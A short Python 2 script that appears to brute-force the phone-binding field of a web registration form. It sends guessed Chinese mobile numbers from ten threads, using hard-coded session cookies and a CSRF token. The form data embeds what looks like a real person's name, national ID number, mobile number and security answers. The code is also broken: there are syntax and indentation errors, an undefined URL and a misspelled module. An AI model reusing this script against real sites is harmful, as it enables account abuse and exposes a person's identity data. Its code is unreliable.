import random
import urllib2
import urllib
import Queue
import threading

lists =["1800918",
"1800920",
"1800921",
"1800922",
"1800923",
"1800924",
"1800925",
"1800926",
"1800927",
"1800928",
"1800929",
"1804900",
"1804901",
"1804902",
"1804903",
"1804904",
"1804905",
"1804906",
"1804907",
"1804908",
"1804909",
"1804918",
"1804920",
"1804921",
"1804922",
"1804923",
"1804924",
"1804925",
"1804926",
"1804927",
"1804928",
"1804929",
"1804940",
"1804941",
"1804942",
"1804943",
"1804944",
"1804945",
"1804946",
"1804947",
"1804948",
"1804949",
"1804950",
"1804951",
"1804952",
"1804953",
"1804954",
"1804955",
"1804956",
"1804957",
"1804958",
"1804959",
"1804960",
"1804961",
"1804962",
"1804963",
"1804964",
"1804965",
"1804966",
"1804967",
"1804968",
"1804969",
"1806650",
"1806651",
"1806652",
"1806653",
"1806654",
"1806655",
"1806656",
"1806657",
"1806658",
"1806659",
"1806660",
"1806661",
"1806662",
"1806663",
"1806664",
"1806665",
"1806666",
"1806667",
"1806668",
"1806669",
"1806670",
"1806671",
"1806672",
"1806673",
"1806674",
"1806675",
"1806676",
"1806677",
"1806678",
"1806679",
"1806680",
"1806681",
"1806682",
"1806683",
"1806684",
"1806685",
"1806686",
"1806687",
"1806688",
"1806689",
"1806690",
"1806691",
"1806692",
"1806693",
"1806694",
"1806695",
"1806696",
"1806697",
"1806698",
"1806699",
"1808260",
"1808261",
"1808262",
"1808263",
"1808264",
"1808265",
"1808266",
"1808267",
"1808268",
"1808269",
"1808853",
"1808854",
"1808896",
"1808898",
"1808899",
"1808920",
"1808921",
"1808922",
"1808923",
"1808924",
"1808925",
"1808926",
"1808927",
"1808928",
"1808929",
"1809108",
"1809109",
"1809118",
"1809119",
"1809128",
"1809129",
"1809138",
"1809139",
"1809158",
"1809159",
"1809178",
"1809179",
"1809180",
"1809181",
"1809182",
"1809183",
"1809184",
"1809185",
"1809186",
"1809187",
"1809188",
"1809189",
"1809200",
"1809201",
"1809202",
"1809203",
"1809204",
"1809205",
"1809206",
"1809207",
"1809208",
"1809209",
"1809210",
"1809211",
"1809212",
"1809213",
"1809214",
"1809215",
"1809216",
"1809217",
"1809218",
"1809219",
"1809220",
"1809221",
"1809222",
"1809223",
"1809224",
"1809225",
"1809226",
"1809227",
"1809228",
"1809229",
"1809230",
"1809231",
"1809232",
"1809233",
"1809234",
"1809235",
"1809236",
"1809237",
"1809238",
"1809239",
"1809240",
"1809241",
"1809242",
"1809243",
"1809244",
"1809245",
"1809246",
"1809247",
"1809248",
"1809249",
"1809250",
"1809251",
"1809252",
"1809253",
"1809254",
"1809255",
"1809256",
"1809257",
"1809258",
"1809259",
"1809260",
"1809261",
"1809262",
"1809263",
"1809264",
"1809265",
"1809266",
"1809267",
"1809268",
"1809269",
"1809270",
"1809271",
"1809272",
"1809273",
"1809274",
"1809275",
"1809276",
"1809277",
"1809278",
"1809279",
"1809280",
"1809281",
"1809282",
"1809283",
"1809284",
"1809285",
"1809286",
"1809287",
"1809288",
"1809289",
"1809290",
"1809291",
"1809292",
"1809293",
"1809294",
"1809295",
"1809296",
"1809297",
"1809298",
"1809299",]


number = Queue.Queue()

for i in range(len(lists)):
    for j in range(0,10):
    	#取到所有匹配的手机号
        iphone = random.choice(lists) + str(i) + str(706)
        number.put(iphone)


def crawl():
	
	while not number.empty():
	    num = number.get()
	formdata={
		"_token":"CqgWrNn6mZZ9MqoIPO2UrDsy8E1IOlmYB1qMb1YO",
		"regname":"翟乐乐",
		"regbirthday":"",	
		"regidcard":"610323199305166817",
		"regtel":""	
		"regmobile":"18300668073",
		"bindmobile":number,
		"regemail":"",	
		"regquestion1":"我的小学名字？",
		"reganswer1":"小学",
		"regquestion2":"我的学号（或工号）是？",
		"reganswer2":"0205",
		}

	headers = {
		"Connection":" keep-alive",
		"Content-Length":" 424",
		"Cache-Control":" max-age=0",
		"Upgrade-Insecure-Requests":" 1",
		"Content-Type":" application/x-www-form-urlencoded",
		"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
		"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"Cookie": "XSRF-TOKEN=eyJpdiI6ImdIS01RZjJ6WjF1RUNBZHEzbXlKMmc9PSIsInZhbHVlIjoibktKbjlsd2crazNtOVcybkM1UXdLdnJlNkZtd3p2ZlV2SytvMXkwRkhqTTcrTzRCRXZNQkE4NmtBTXhOZmpBM2I4WWFXQWQ0ME1DVFVBR3ZoaVFRNXc9PSIsIm1hYyI6ImEwNzIyYjIxYzVjY2M5YjYzNzBmZDU2MDA1NGI5OGJmY2YzOTkwNmVmZTZmNjhmYTQzZDZlZTJlYzllMWZmMjMifQ%3D%3D; laravel_session=eyJpdiI6ImRpUDBvSFgwODh6MkwyS0FJOWNaUGc9PSIsInZhbHVlIjoiYVB1VzRGQjVPQW5wOFM2WkRcL2p6eERsUTRoZFRRVlwvVk1ybmxSUHNnOVo4YmhFS0ZxazNieE1XWUdTcElHQjEyXC9LUUM1ektwTFdCWllIeHZtNW9zZ1E9PSIsIm1hYyI6IjY0ZDg0M2QyNDc1M2RkMzg2MzA4ZDAwMmJjMDVmYTk5YmJkYTJiYmU3Mzg2OWFlOGE5MGQ2YzAzYzY1NWM1YmYifQ%3D%3D"
	}

	data = urllib.urlencode(formdata)
	print number
	request = urllib2.Request(url,data=data,headers=headers)
	print urlib2.urlopen(request).read()


if __name__ == "__main__":
	threads = 10
	for i in range(threads):
		line = threading.Thread(target=crawl)
		line.start()
